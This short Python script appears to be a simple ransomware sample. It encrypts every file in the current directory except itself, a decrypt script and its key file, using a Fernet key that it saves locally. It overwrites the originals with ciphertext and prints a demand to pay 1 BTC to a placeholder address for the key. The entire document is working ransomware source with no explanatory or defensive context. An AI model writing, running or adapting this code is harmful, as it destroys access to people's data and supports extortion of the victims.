
#Library Imports
import os
from cryptography.fernet import Fernet

files = [] #list variable for storing the files we will encrypt

for file in os.listdir():
    if file == "main.py" or file == "decrypt.py" or file == "keyfile.txt":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

with open("keyfile.txt", "wb") as keyfile:
    keyfile.write(key)

for file in files:
    with open(file, "rb") as current_file:
        contents = current_file.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as current_file:
        current_file.write(encrypted_contents)
    print(file, " has been encrypted please pay 1BTC to $BTCADDRESS to receive the key")


